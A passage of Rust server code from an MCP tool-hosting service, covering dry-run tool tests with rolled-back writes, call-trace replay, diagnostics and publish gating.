                    message: format!(
                        "fixtures total {total} bytes; the limit is {} bytes",
                        crate::runs::RUN_PART_BYTES
                    ),
                    data: json!({"limit_bytes": crate::runs::RUN_PART_BYTES, "given_bytes": total}),
                });
            }
        }

        // PRD-mcphost-sandbox-ready requirement 3 (AC3): same first-try
        // rejection as `host.tool_publish`, before this tool's kind is ever
        // dispatched to.
        if let Some(status) = kind.sandbox_status()
            && !status.ready
        {
            // PRD-mcphost-first-publish-real-kind requirement 3 (AC2): same
            // retry-after estimate `control::tool_publish` computes.
            let retry_after_s = kind.queue_wait_estimate_s().unwrap_or(5).clamp(1, 30);
            return Err(AppError::sandbox_unavailable(&status, retry_after_s));
        }

        let descriptor = kind.describe(&row.spec);
        // R3/R2 (AC3/AC4): generate before anything validates or runs; an
        // example that fails its own schema is refused with no sandbox run.
        let mut generated: Option<crate::kinds::example::Example> = None;
        if !args_given && !kind.validates_own_args() {
            let ex = example_or_refusal(&descriptor.input_schema)?;
            call_args = ex.args.clone();
            generated = Some(ex);
        }
        // PRD-mcphost-chain-run-lineage requirement 2/10: `host.tool_test`
        // must be able to dry-run a chain missing some of its required
        // inputs (reporting `inputs_required`/unresolved paths rather than
        // refusing outright) -- see `Kind::validates_own_args`'s own doc
        // comment.
        if !kind.validates_own_args()
            && let Ok(validator) = jsonschema::validator_for(&descriptor.input_schema)
            && let Err(e) = validator.validate(&call_args)
        {
            // Requirement 1/AC3 (PRD-mcphost-python-kind-runtime): phase
            // `args_coercion`, naming the argument and both types -- shared
            // with every kind via `describe_args_error`, wired through
            // `AppError::Structured` (not `ArgsInvalid`) so the extra `data`
            // fields survive into the JSON-RPC response; the wire code stays
            // pinned to exactly `args_invalid` either way.
            let args_err = describe_args_error(&e);
            return Err(AppError::Structured {
                code: crate::errors::ARGS_INVALID,
                message: args_err.message(),
                data: args_err.data(),
            });
        }

        let secret_map = build_secret_map(&self.state, tenant.id).await?;
        let secrets = secret_resolver_for(&self.state, tenant.id, secret_map.clone()).await?;
        // PRD-mcphost-dry-run-side-effects requirement 2/3: every bridge
        // write this call makes routes through this one `DryRunCtx` (shared
        // via `TenantStateBridge`/`TenantTableBridge`), rolled back once
        // `kind.call` below returns -- `host.tool_test` is always a test.
        let dry_run = crate::dryrun::DryRunCtx::new(self.state.db.path().to_path_buf(), self.state.db.cfg());
        let state_backend = Arc::new(CountingStateBackend::new(
            Arc::new(TenantStateBridge {
                state: self.state.clone(),
                tenant: tenant.clone(),
                end_user: None,
                dry_run: Some(dry_run.clone()),
            }),
            None,
        ));
        let table_backend: Arc<dyn TableBackend> = Arc::new(TenantTableBridge {
            state: self.state.clone(),
            tenant: tenant.clone(),
            dry_run: Some(dry_run.clone()),
            end_user: None,
        });
        let docs_backend: Arc<dyn DocsBackend> = Arc::new(TenantDocsBridge {
            state: self.state.clone(),
            tenant: tenant.clone(),
            end_user: None,
        });
        let lineage_backend: Arc<dyn LineageBackend> = Arc::new(TenantLineageBridge {
            state: self.state.clone(),
            tenant: tenant.clone(),
        });
        let drift_backend: Arc<dyn DriftBackend> = Arc::new(TenantDriftBridge {
            state: self.state.clone(),
            tenant: tenant.clone(),
        });
        // PRD-mcphost-sandbox-channel-msg-bridge requirement 4 (AC4): the
        // real tenant backends are wired in even for this dry-run path --
        // `ChannelSidecarBridge`/`MsgSidecarBridge` short-circuit on
        // `ctx.test_mode` before ever reaching them, so `channel.read`
        // (not a side effect) still works normally while `channel.post`/
        // `msg.send` never do.
        let channel_backend: Arc<dyn ChannelBackend> = Arc::new(TenantChannelBridge {
            state: self.state.clone(),
            tenant: tenant.clone(),
        });
        let msg_backend: Arc<dyn MsgBackend> = Arc::new(TenantMsgBridge {
            state: self.state.clone(),
            tenant: tenant.clone(),
        });
        let resources = Arc::new(CellResourceSink::new());
        let resolved_timeout = self.resolve_call_timeout(&kind, &row.spec);
        let ctx = CallCtx {
            tenant_id: tenant.id,
            namespace: tenant.namespace.clone(),
            secrets,
            deadline: Instant::now() + resolved_timeout,
            log: Arc::new(NullLog) as Arc<dyn CallLog>,
            test_mode: true,
            resources: resources.clone() as Arc<dyn ResourceSink>,
            tool_name: Some(local_name.clone()),
            // requirement 5 / AC7: `host.tool_test` persists no logs (`log`
            // above is `NullLog`), but its *result* carries a `state` tally
            // -- read back from `state_backend` after the call below.
            state: state_backend.clone() as Arc<dyn StateBackend>,
            table: table_backend.clone(),
            docs: docs_backend.clone(),
            lineage: lineage_backend.clone(),
            drift: drift_backend.clone(),
            channel: channel_backend.clone(),
            msg: msg_backend.clone(),
            elicit: Arc::new(crate::elicit::NoClientElicit),
            sampling: Arc::new(crate::sampling::NoClientSampling { state: None }),
            sidecar_ops: Arc::new(std::sync::atomic::AtomicI64::new(0)),
            sidecar_ops_max: self.sidecar_ops_cap(tenant),
            // PRD-mcphost-composition requirement 3/AC8: `chain`'s dry run
            // (`ctx.test_mode`) resolves only literal and `$.input.*`
            // mappings -- it never dispatches a step.
            //
            // PRD-mcphost-tool-test-truth P0 requirement 2 (AC1-3): `chain`'s
            // own dry run still needs read-only descriptor lookups (a
            // predecessor step's declared outputs) to give `$.prev`/
            // `$.steps[i]` a verdict, so `compose_db`/`compose_kinds` ARE
            // populated here -- `compose_children` stays `None` either way,
            // and [`crate::kinds::compose_dispatch`] checks `compose_children`
            // before it ever reaches `compose_db`/`compose_kinds`, so a
            // composing python tool's `mcphost.call` still refuses with
            // `composition is unavailable in this call context` exactly as
            // before (AC4's own non-goal: no real dispatch inside a dry
            // run) -- only `chain`'s own lookup-only use of these two
            // fields changes.
            compose_depth: 0,
            compose_children: None,
            compose_db: Some(self.state.db.clone()),
            compose_kinds: Some(self.state.kinds.clone()),
            concurrent_calls_per_tenant: self.concurrent_calls_cap(tenant),
            chain_fanout_max: self.chain_fanout_cap(tenant),
            // PRD-mcphost-sandbox-egress-allowlist requirement 1/2/3: resolved
            // from the tenant's plan here, once, same convention as
            // `concurrent_calls_per_tenant` just above.
            egress_allowed: tenant.plan == "pro",
            sandbox_ceilings: self.state.plans.sandbox_ceilings(&tenant.plan),
            // PRD-mcphost-runs-and-jobs: an ordinary synchronous dispatch is
            // never a job -- no run id to report progress against, no pid
            // slot `host.runs.cancel` would ever look up.
            run_id: None,
            progress: crate::progress::current_sink(),
            cancel_pid: Arc::new(crate::runs::CancelSlot::default()),
            // PRD-mcphost-end-user-identity: `host.tool_test` is a dry run
            // against the real upstream, not a metered call -- no end user
            // to thread through.
            end_user: None,
            vault_token: None,
            // PRD-mcphost-dry-run-side-effects requirement 1/2 (AC5): lets a
            // `chain` step naming an allowlisted `host.*` verb (e.g.
            // `host.table.append`) dispatch through the SAME
            // `table_backend`/`state_backend` this call's own
            // `mcphost.table`/`mcphost.state` sandbox calls use -- so its
            // write lands in this call's `DryRunCtx` savepoint and is
            // reported into `dry_run.writes` identically. Uses
            // `DryRunHostStepBridge`, not the real-dispatch
            // `TenantHostStepBridge` above (that one commits outside any
            // savepoint, which a dry run must never do).
            host_dispatch: Some(Arc::new(DryRunHostStepBridge {
                table: table_backend.clone(),
                state: state_backend.clone() as Arc<dyn StateBackend>,
            })),
            // PRD-mcphost-chain-run-lineage: `host.tool_test` writes no run
            // row of its own (same "no `calls` row, no metering" contract
            // as every other field here already documents) -- nothing for
            // a composed child to attribute to, same as `compose_db` above.
            parent_run_id: None,
            budget: None,
            prev_result: None,
        };

        // PRD-mcphost-call-trace-replay requirement 1: a dry run writes a
        // `calls` row too (outcome `test`, never metered) so its result can
        // carry a `call_id` and be traced like any other call.
        let trace_args = call_args.clone();
        let capture = crate::calltrace::enabled().then(crate::calltrace::new_capture);
        let started = Instant::now();
        let call_fut = tokio::time::timeout(resolved_timeout, kind.call(&row.spec, call_args, &ctx));
        let call = async {
            match fixtures {
                Some(fixtures) => {
                    crate::dryrun::with_dry_run(
                        dry_run.clone(),
                        crate::kinds::chain::with_fixtures(fixtures, call_fut),
                    )
                    .await
                }
                None => crate::dryrun::with_dry_run(dry_run.clone(), call_fut).await,
            }
        };
        let outcome = match &capture {
            Some(cap) => crate::calltrace::scope(cap.clone(), call).await,
            None => call.await,
        };
        let duration_ms = started.elapsed().as_millis() as i64;
        let error_info = match &outcome {
            Ok(Err(kind_err)) => Some(crate::calltrace::kind_error_info(kind_err)),
            Err(_) => Some(json!({"code": "call_timeout"})),
            Ok(Ok(_)) => None,
        };
        // Requirement 2: rolled back regardless of outcome (success, a
        // tool-level error, or a timeout) -- a dry run leaves the tenant's
        // data byte-identical either way.
        crate::dryrun::finish(dry_run.clone()).await;

        let result = match outcome {
            // AC19: `tenant_key` may appear anywhere inside the echoed
            // request `call_tool` already redacted from `args` by key name
            // before it reached here -- this final pass catches the same
            // key name inside whatever the kind's own (by-value) redaction
            // returned, proving the redaction is by key name rather than by
            // matching a value the caller controls.
            Ok(Ok(value)) => {
                let mut value = crate::secrets::redact_keys(&value, &["tenant_key"]);
                // PRD-mcphost-result-envelope-contract requirement 4, AC4:
                // before publish, name any declared output field this
                // spec's implementation buries -- `kind.declared_outputs`
                // is `Vec::new()` (no report at all) for a spec that
                // declares none, so this is invisible to every tool
                // published before this PRD.
                let declared = kind.declared_outputs(&row.spec);
                if !declared.is_empty()
                    && let Some(envelope) = crate::kinds::envelope_report(
                        &declared,
                        kind.payload_from_call_result(&value),
                        kind.source_for_output_search(&value),
                    )
                    && let Value::Object(map) = &mut value
                {
                    map.insert("envelope".to_string(), envelope);
                }
                if let Value::Object(map) = &mut value {
                    if let Some(ex) = &generated {
                        add_example_fields(map, ex);
                    }
                    // PRD-mcphost-sandbox-resource-limits-from-plan R5: a
                    // dry run measures before publishing too.
                    let used = if kind.name() == "python" { resources.resources_used(duration_ms) } else { None };
                    // PRD-mcphost-dry-run-side-effects requirement 3: `.entry`
                    // (not a plain `insert`) so `chain`'s own pre-existing
                    // top-level `dry_run: true` boolean (its requirement 3 /
                    // AC8 dry-run report, which never dispatches a step at
                    // all) is left alone -- `chain` targeting a host step is
                    // PRD-mcphost-chain-host-steps' own, not-yet-landed,
                    // scope.
                    crate::envelope::stamp_tool_test(map, state_backend.snapshot().to_json(), used, || {
                        json!({"writes": dry_run.writes(), "delivered": false, "rolled_back": true})
                    });
                    // PRD-mcphost-tool-test-truth P0 requirement 1 (AC5):
                    // `.entry` (not a plain `insert`) so a kind that already
                    // set its own `verdict` -- `chain`'s own `pass`/
                    // `will_fail`/`unverifiable` (AC1-3), or a composing
                    // python tool's `unverifiable` (AC4) -- is left alone;
                    // every other dry run that got this far ran/resolved
                    // cleanly with no composition to doubt, so it defaults
                    // to `pass`.
                    map.entry("verdict".to_string()).or_insert_with(|| json!("pass"));
                    // PRD-mcphost-plan-limits-generated requirement 5: the
                    // tool's declared timeout can sit above the caller
                    // plan's `budget.max_tool_latency_ms` ceiling, which a
                    // real call with a budget would be refused for.
                    if let Some(warning) = self.latency_ceiling_warning(tenant, resolved_timeout) {
                        map.entry("warnings".to_string())
                            .or_insert_with(|| json!([]));
                        if let Some(Value::Array(list)) = map.get_mut("warnings") {
                            list.push(json!(warning));
                        }
                    }
                }
                Ok(value)
            }
            // PRD-mcphost-sandbox-return-shape-contract requirement 4 (AC3): a
            // tool that treats a bridge envelope as a list dies with the
            // runner's `BridgeShapeError`; the dry run reports that as a
            // `will_fail` verdict with the error text and the user's own
            // line, not as a bare tool error the agent has to decode.
            Ok(Err(KindError::Structured { code: TOOL_EXCEPTION, message, data }))
                if data.get("exception_class").and_then(Value::as_str) == Some("BridgeShapeError") =>
            {
                let mut report = json!({
                    "verdict": "will_fail",
                    "error": message,
                    "exception_class": "BridgeShapeError",
                    "state": state_backend.snapshot().to_json(),
                    "dry_run": {"writes": dry_run.writes(), "delivered": false, "rolled_back": true},
                });
                if let Value::Object(map) = &mut report {
                    for key in ["line", "source_line"] {
                        if let Some(v) = data.get(key) {
                            map.insert(key.to_string(), v.clone());
                        }
                    }
                }
                Ok(report)
            }
            Ok(Err(kind_err)) => Err(AppError::from(kind_err)),
            Err(_elapsed) => Err(AppError::CallTimeout(resolved_timeout.as_secs())),
        };
        // The publish gate's own dry run (`require_tested`) leaves no `calls`
        // row: a pro tenant would otherwise be metered for a call it never
        // made.
        if args.get("_pubvis_gate").and_then(Value::as_bool) == Some(true) {
            return result;
        }
        self.finish_test_call(tenant, &local_name, &trace_args, &secret_map, capture.as_ref(), duration_ms, error_info, result)
            .await
    }

    /// PRD-mcphost-call-trace-replay requirement 1/2: writes the `calls` row
    /// (and trace) of a `host.tool.test` / `host.tool.run` and puts its id on
    /// the result as `call_id`. A failure to write never changes the result.
    #[allow(clippy::too_many_arguments)]
    async fn finish_test_call(
        &self,
        tenant: &Tenant,
        tool: &str,
        args: &Value,
        secret_map: &HashMap<String, String>,
        capture: Option<&crate::calltrace::SharedCapture>,
        duration_ms: i64,
        error_info: Option<Value>,
        result: Result<Value, AppError>,
    ) -> Result<Value, AppError> {
        let (ok, code) = match &result {
            Err(e) => (false, Some(e.code().to_string())),
            Ok(v) if v.get("verdict").and_then(Value::as_str) == Some("will_fail") => (
                false,
                Some(
                    error_info
                        .as_ref()
                        .and_then(|i| i.get("code"))
                        .and_then(Value::as_str)
                        .unwrap_or("will_fail")
                        .to_string(),
                ),
            ),
            Ok(_) => (true, None),
        };
        let trace = crate::calltrace::enabled()
            .then(|| crate::calltrace::build_trace(secret_map, tool, args, capture, error_info));
        match self
            .state
            .db
            .record_test_call(
                tenant.id,
                format!("__tool_test__.{tool}"),
                duration_ms,
                ok,
                code,
                tenant.origin.clone(),
                tenant.origin_detail.clone(),
                trace,
            )
            .await
        {
            Ok(call_id) => crate::calltrace::attach_call_id(result, call_id),
            Err(e) => {
                tracing::warn!(error = %e, tenant = %tenant.namespace, tool, "failed to record a test call row");
                result
            }
        }
    }
    /// PRD-mcphost-host-doctor-tool R2/R5/R6: `host.doctor`. `tenant` is
    /// `None` for the admin bearer, which must name the tenant to read.
    async fn doctor(&self, tenant: Option<&Tenant>, args: Value) -> Result<Value, AppError> {
        let limit = match args.get("limit") {
            None | Some(Value::Null) => 50,
            Some(v) => v
                .as_i64()
                .filter(|n| (1..=200).contains(n))
                .ok_or_else(|| AppError::InvalidArgs("limit must be an integer from 1 to 200".into()))?,
        };
        let since_s = match args.get("since_s") {
            None | Some(Value::Null) => None,
            Some(v) => Some(
                v.as_i64()
                    .filter(|n| *n >= 1)
                    .ok_or_else(|| AppError::InvalidArgs("since_s must be a positive integer".into()))?,
            ),
        };
        let tool = args.get("tool").and_then(Value::as_str).map(str::to_string);
        let named = args.get("tenant").and_then(Value::as_str);
        let target_id = match (tenant, named) {
            (Some(t), None) => t.id,
            (Some(t), Some(ns)) if ns == t.namespace => t.id,
            (Some(_), Some(_)) => return Err(AppError::Forbidden),
            (None, Some(ns)) => {
                self.state
                    .db
                    .find_tenant_by_namespace(ns.to_string())
                    .await?
                    .ok_or_else(|| AppError::TenantNotFound(ns.to_string()))?
                    .id
            }
            (None, None) => {
                return Err(AppError::InvalidArgs("the admin key must pass tenant: <namespace>".into()));
            }
        };
        let since_unix = since_s.map(|s| now_unix() - s);
        let (rows, calls) = self.state.db.doctor_failed_calls(target_id, limit, tool, since_unix).await?;
        // The first call compiles every verb's error-branch schema (`jsonschema::validator_for`,
        // a deep recursion): +152 KiB of stack on the caller's thread, measured against every other
        // forwarded verb (fwdtab AC5, 2026-10-18). A blocking-pool thread has its own stack, and the
        // report is computed once (`OnceLock`), so later calls read it back at no depth.
        let envelope = match tokio::task::spawn_blocking(crate::output_schemas::error_envelope_report).await {
            Ok(report) => report,
            Err(_) => crate::output_schemas::error_envelope_report(),
        };
        let mut out = json!({
            "window": {
                "calls": calls,
                "failed": rows.len(),
                "first_ts": rows.last().map(|r| r.started_at.clone()),
                "last_ts": rows.first().map(|r| r.started_at.clone()),
            },
            "groups": crate::doctor::build_groups(&rows),
            "error_envelope": {
                "validated": envelope.validated,
                "skipped": envelope.skipped,
            },
            "output_reach": {
                "unreached": crate::output_schemas::reach_report().unreached,
                "unreached_cap": crate::output_schemas::reach_report().unreached_cap,
            },
            "oauth_issuers": crate::oauth::doctor_report(&self.state, tenant.map(|t| t.id)).await?,
            "tenant_lifecycle": self.tenant_lifecycle_view(target_id).await?,
        });
        if rows.is_empty() {
            out["next"] = json!(crate::doctor::empty_next(limit));
            if self.state.db.count_tools(target_id).await? == 0 {
                out["hint"] = json!("host.quickstart");
            }
        }
        Ok(out)
    }

    /// `host.doctor`'s `tenant_lifecycle`: the external unclaimed policy when
    /// the tenant is one of its subjects, else the synthetic implicit one.
    async fn tenant_lifecycle_view(&self, tenant_id: i64) -> Result<Value, AppError> {
        let external = self.state.db.external_subjects(Some(tenant_id)).await?;
        if let Some(subject) = external.get(&tenant_id) {
            let window = self.state.db.external_expiry_window_days().await?;
            return Ok(crate::retention::external_lifecycle_view(subject, window, now_unix()));
        }
        Ok(crate::retention::lifecycle_view(
            self.state.db.synthetic_expiry_window_days().await?,
            self.state.db.tenant_expires_at(tenant_id).await?,
        ))
    }

    /// PRD-mcphost-call-trace-replay R5/R6: `host.call_trace`. `tenant` is
    /// `None` for the admin bearer, which may read any tenant's trace but
    /// never replays one (a replay runs as the call's owner).
    async fn call_trace(&self, tenant: Option<&Tenant>, args: Value) -> Result<Value, AppError> {
        let call_id: i64 = match args.get("call_id") {
            Some(Value::String(s)) => s.trim().parse().ok(),
            Some(Value::Number(n)) => n.as_i64(),
            _ => None,
        }
        .ok_or_else(|| {
            AppError::InvalidArgs("call_id must be the string call_id a tool-call result returned".into())
        })?;
        let row = self.state.db.get_call_trace(call_id).await?.ok_or_else(|| AppError::Structured {
            code: TRACE_NOT_FOUND,
            message: format!("no trace for call_id {call_id}: unknown, expired, or made before traces existed"),
            data: json!({"call_id": call_id.to_string(), "reason": "unknown_or_expired"}),
        })?;
        if let Some(tenant) = tenant
            && row.tenant_id != tenant.id
        {
            return Err(AppError::Forbidden);
        }
        let request: Value = serde_json::from_str(&row.request_json).unwrap_or(Value::Null);
        let timings: Value = serde_json::from_str(&row.timings_json).unwrap_or(Value::Null);
        let error: Option<Value> = row.error_json.as_deref().and_then(|e| serde_json::from_str(e).ok());
        let outcome = match row.outcome.as_str() {
            "test" if error.is_some() => "error".to_string(),
            "test" => "ok".to_string(),
            other => other.to_string(),
        };
        let error_code = error
            .as_ref()
            .and_then(|e| e.get("code"))
            .and_then(Value::as_str)
            .map(str::to_string)
            .or_else(|| row.error_class.clone());
        let tool = request.get("tool").and_then(Value::as_str).unwrap_or(&row.tool_name).to_string();
        let mut out = json!({
            "call_id": row.call_id.to_string(),
            "tool": tool,
            "started_at": row.started_at,
            "outcome": outcome,
            "request": request,
            "stdout_tail": row.stdout_tail,
            "stderr_tail": row.stderr_tail,
            "timings": timings,
        });
        if let Some(code) = &error_code {
            out["error_code"] = json!(code);
        }
        for key in ["line", "source_line", "message"] {
            if let Some(v) = error.as_ref().and_then(|e| e.get(key)) {
                out[key] = v.clone();
            }
        }
        let Some(replay) = args.get("replay").filter(|r| !r.is_null()) else {
            return Ok(out);
        };
        let Some(tenant) = tenant else {
            return Err(AppError::Forbidden);
        };
        let edits = match replay.get("args") {
            None | Some(Value::Null) => Map::new(),
            Some(Value::Object(m)) => m.clone(),
            Some(_) => return Err(AppError::InvalidArgs("replay.args must be an object".into())),
        };
        let mut merged = match out["request"].get("args") {
            Some(Value::Object(m)) => m.clone(),
            _ => Map::new(),
        };
        if merged.get("_truncated") == Some(&json!(true)) {
            return Err(AppError::Structured {
                code: REPLAY_NEEDS_SECRET,
                message: "the recorded request was too large to keep, so it cannot be replayed; pass the full replay.args".into(),
                data: json!({"key": "_truncated"}),
            });
        }
        for (k, v) in edits {
            merged.insert(k, v);
        }
        let secret_map = build_secret_map(&self.state, tenant.id).await?;
        let mut merged = Value::Object(merged);
        if let Some(key) = crate::calltrace::unresolved_secret_key(&mut merged, &secret_map) {
            return Err(AppError::Structured {
                code: REPLAY_NEEDS_SECRET,
                message: format!(
                    "'{key}' is still masked in the recorded request; pass its value in replay.args"
                ),
                data: json!({"key": key}),
            });
        }
        let before_ok = outcome == "ok";
        let tested = self.tool_test(tenant, json!({"name": tool, "args": merged})).await;
        let (result, verdict, after_ok, after_code) = match tested {
            Ok(v) => {
                let verdict = v.get("verdict").and_then(Value::as_str).unwrap_or("pass").to_string();
                let ok = verdict != "will_fail";
                let code = (!ok).then(|| "tool_exception".to_string());
                (v, verdict, ok, code)
            }
            Err(e) => {
                let code = e.code().to_string();
                let mut body = json!({"error_code": code, "message": e.to_string()});
                if let AppError::Structured { data: Value::Object(d), .. } = &e {
                    for (k, v) in d {
                        body[k] = v.clone();
                    }
                }
                (body, "fail".to_string(), false, Some(code))
            }
        };
        let replay_call_id = result.get("call_id").cloned().unwrap_or(Value::Null);
        out["replay"] = json!({
            "call_id": replay_call_id,
            "result": result,
            "verdict": verdict,
            "diff": {"ok": [before_ok, after_ok], "error_code": [error_code, after_code]},
        });
        out["delivered"] = json!(false);
        Ok(out)
    }

    /// PRD-mcphost-plan-limits-generated requirement 5 (AC6): the warning
    /// `host.tool_test` attaches when a tool's resolved timeout exceeds the
    /// caller plan's `budget_max_tool_latency_ms`, naming both numbers.
    fn latency_ceiling_warning(&self, tenant: &Tenant, timeout: Duration) -> Option<String> {
        let plan = self.state.plans.get(&tenant.plan)?;
        let ceiling_ms = plan.budget_max_tool_latency_ms;
        let timeout_ms = timeout.as_millis() as i64;
        (timeout_ms > ceiling_ms).then(|| {
            format!(
                "timeout_s {} ({timeout_ms} ms) exceeds the {} plan's budget.max_tool_latency_ms \
                 ceiling of {ceiling_ms} ms; calls with a budget are refused above the ceiling \
                 -- see host.quickstart limits.plan",
                timeout.as_secs(),
                plan.name
            )
        })
    }

    /// `host.bridge_test` (PRD-mcphost-rest-bridge P1 requirement, AC6):
    /// `host.tool_test`'s sibling for a spec that hasn't been published
    /// yet -- "test before deploy" for a REST-bridge `upstream` spec (or
    /// any `http`-kind spec). Unlike `tool_test`, it takes the `spec`
    /// argument directly rather than looking a tool up by name, so nothing
    /// is stored in the tenant's tool table: an invalid spec fails at
    /// `validate` and a valid one performs the real dry-run call exactly
    /// like `tool_test` (real upstream, no `calls` row, no persisted
    /// logs, secrets redacted from the echoed request).
    async fn bridge_test(&self, tenant: &Tenant, args: Value) -> Result<Value, AppError> {
        let spec = args
            .get("spec")
            .cloned()
            .ok_or_else(|| AppError::InvalidArgs("missing required argument 'spec'".into()))?;
        let call_args = args
            .get("args")
            .cloned()
            .unwrap_or_else(|| Value::Object(Default::default()));

        let kind: Arc<dyn Kind> = self.state.kinds.get("http").ok_or_else(|| {
            AppError::Internal("the 'http' kind is not registered on this host".into())
        })?;

        // AC6's "invalid bridge spec ... reports the failure class": the
        // same `validate` a real `host.tool_publish` would run, so a spec
        // that would be rejected at publish time fails identically here,
        // before any request is attempted.
        if let Err(e) = KindRegistry::validate_checked(kind.as_ref(), &spec) {
            let err = crate::kinds::kinddoc::enrich_invalid_spec(kind.as_ref(), AppError::from(e));
            return Err(crate::hooks::enrich_own_hook_refusal(&self.state, tenant, &spec, err).await);
        }

        let descriptor = kind.describe(&spec);
        if let Ok(validator) = jsonschema::validator_for(&descriptor.input_schema)
            && let Err(e) = validator.validate(&call_args)
        {
            let args_err = describe_args_error(&e);
            return Err(AppError::Structured {
                code: crate::errors::ARGS_INVALID,
                message: args_err.message(),
                data: args_err.data(),
            });
        }

        let secrets = build_secret_resolver(&self.state, tenant.id).await?;
        let resolved_timeout = self.resolve_call_timeout(&kind, &spec);
        let ctx = CallCtx {
            tenant_id: tenant.id,
            namespace: tenant.namespace.clone(),
            secrets,
            deadline: Instant::now() + resolved_timeout,
            log: Arc::new(NullLog) as Arc<dyn CallLog>,
            test_mode: true,
            resources: Arc::new(NullResourceSink),
            tool_name: None,
            // `host.bridge_test` always dispatches to the `http` kind
            // (fixed above), which has no notion of `mcphost.state` --
            // `NoState` is correct here, not a stand-in for a real backend.
            state: Arc::new(NoState),
            table: Arc::new(NoTable),
            docs: Arc::new(NoDocs),
            lineage: Arc::new(NoLineage),
            drift: Arc::new(crate::kinds::NoDrift),
            // `host.bridge_test` always dispatches to the `http` kind
            // (fixed above), which has no notion of `mcphost.channel`/
            // `mcphost.msg` either -- same `NoChannel`/`NoMsg` reasoning as
            // `NoState` above.
            channel: Arc::new(NoChannel),
            msg: Arc::new(NoMsg),
            elicit: Arc::new(crate::elicit::NoClientElicit),
            sampling: Arc::new(crate::sampling::NoClientSampling { state: None }),
            sidecar_ops: Arc::new(std::sync::atomic::AtomicI64::new(0)),
            sidecar_ops_max: i64::MAX,
            compose_depth: 0,
            compose_children: None,
            compose_db: None,
            compose_kinds: None,
            concurrent_calls_per_tenant: self.concurrent_calls_cap(tenant),
            chain_fanout_max: self.chain_fanout_cap(tenant),
            // PRD-mcphost-sandbox-egress-allowlist requirement 1/2/3: resolved
            // from the tenant's plan here, once, same convention as
            // `concurrent_calls_per_tenant` just above.
            egress_allowed: tenant.plan == "pro",
            sandbox_ceilings: self.state.plans.sandbox_ceilings(&tenant.plan),
            // PRD-mcphost-runs-and-jobs: an ordinary synchronous dispatch is
            // never a job -- no run id to report progress against, no pid
            // slot `host.runs.cancel` would ever look up.
            run_id: None,
            progress: crate::progress::current_sink(),
            cancel_pid: Arc::new(crate::runs::CancelSlot::default()),
            // PRD-mcphost-end-user-identity: `host.bridge_test` is a dry
            // run, not a metered call -- no end user to thread through.
            end_user: None,
            vault_token: None,
            // `host.bridge_test` always dispatches to the `http` kind
            // (fixed above), which never composes -- nothing to reach here.
            host_dispatch: None,
            // PRD-mcphost-chain-run-lineage: a dry run against an
            // unpublished spec has no run row of its own to hang a
            // composed child from.
            parent_run_id: None,
            budget: None,
            prev_result: None,
        };

        match tokio::time::timeout(resolved_timeout, kind.call(&spec, call_args, &ctx)).await {
            Ok(Ok(value)) => Ok(crate::secrets::redact_keys(&value, &["tenant_key"])),
            Ok(Err(kind_err)) => Err(AppError::from(kind_err)),
            Err(_elapsed) => Err(AppError::CallTimeout(resolved_timeout.as_secs())),
        }
    }

    /// `host.spec_test` (PRD-mcphost-tool-test): dry-runs a `kind` + `spec`
    /// pair that has never been published -- up to
    /// [`crate::kinds::MAX_TEST_INVOCATIONS`] example invocations through
    /// [`crate::kinds::run_spec_test`], the exact same [`Kind::call`] entry
    /// point a published call dispatches to (AC8), each with
    /// `ctx.test_mode = true` so a kind that renders a request (`http`)
    /// echoes it back. No `tools` row is ever written for `spec`.
    ///
    /// Distinct from [`Self::tool_test`] (which dry-runs an
    /// *already-published* tool by name) and named `spec_test` rather than
    /// reusing that name: PRD-mcphost-tool-test's acceptance criteria
    /// describe a pre-publish, multi-invocation, kind-agnostic dry run
    /// (`kind`/`spec`/`invocations` in, per-invocation results out) under
    /// the RPC name `host.tool_test` -- but `host.tool_test` already shipped
    /// on this host with a different, incompatible contract (post-publish,
    /// single invocation, looked up by `name`) that other ACs
    /// (`quickstart`'s own worked example, `host.tool_run`'s sibling
    /// docs) already depend on. Reusing the name would either break that
    /// shipped contract or silently overload one RPC with two argument
    /// shapes; `host.spec_test` delivers this PRD's actual capability
    /// (`host.bridge_test`'s "test a spec you haven't published" idea,
    /// generalized from `http`-only to every kind, and from one invocation
    /// to up to five) without either.
    /// `host.tool_publish`; a `dry_run` with no `invocations` also runs the one
    /// generated example through `spec_test` and reports it beside the gates
    /// (PRD-mcphost-tool-test-examples-from-schema R4, AC5).
    async fn tool_publish_with_example(&self, tenant: &Tenant, args: Value) -> Result<Value, AppError> {
        let mut out = control::tool_publish(&self.state, tenant, &args).await?;
        let dry_run = args.get("dry_run").and_then(Value::as_bool).unwrap_or(false);
        if !dry_run {
            self.apply_publish_visibility(tenant, &args, &mut out).await?;
        }
        let has_invocations = args.get("invocations").is_some_and(|v| !v.is_null());
        let (Some(kind), Some(spec)) = (args.get("kind"), args.get("spec")) else {
            return Ok(out);
        };
        if !dry_run || has_invocations || out["ok"] != json!(true) {
            return Ok(out);
        }
        let tested = self.spec_test(tenant, json!({"kind": kind, "spec": spec})).await;
        if let Some(map) = out.as_object_mut() {
            match tested {
                Ok(t) => {
                    for key in ["invocations", "example_args", "untyped", "schema_hint"] {
                        if let Some(v) = t.get(key) {
                            map.insert(key.to_string(), v.clone());
                        }
                    }
                }
                Err(e) => {
                    map.insert("example_error".to_string(), json!(e.to_string()));
                }
            }
        }
        Ok(out)
    }

    /// PRD-mcphost-publish-visibility-and-tags R4/R5: a passing `host.tool_test`
    /// of the tool's current version stamps `tested_version`, clearing
    /// `stale_test`.
    async fn tool_test_stamping(&self, tenant: &Tenant, args: Value) -> Result<Value, AppError> {
        let name = args.get("name").and_then(Value::as_str).map(str::to_string);
        let mut out = self.tool_test(tenant, args).await?;
        if let Some(name) = name
            && out.get("verdict").and_then(Value::as_str) == Some("pass")
            && let Some(row) = self.state.db.get_tool(tenant.id, name.clone()).await?
        {
            self.state.db.stamp_tested_version(tenant.id, name, row.current_version).await?;
            if let Value::Object(map) = &mut out {
                map.insert("tested_version".to_string(), json!(row.current_version));
                map.insert("stale_test".to_string(), json!(false));
            }
        }
        Ok(out)
    }

    /// R4: `public` needs a passing dry run of the tool's current version.
    /// Skipped when that version already passed; otherwise runs
    /// `host.tool_test` (which stamps on pass). A `will_fail`/`unverifiable`
    /// verdict or an error leaves the stored visibility untouched.
    async fn require_tested(&self, tenant: &Tenant, name: &str) -> Result<(), AppError> {
        let row = self
            .state
            .db
            .get_tool(tenant.id, name.to_string())
            .await?
            .ok_or_else(|| AppError::ToolNotFound(name.to_string()))?;
        if row.tested_version == Some(row.current_version) {
            return Ok(());
        }
        let refusal = |verdict: &str, detail: String| AppError::Structured {
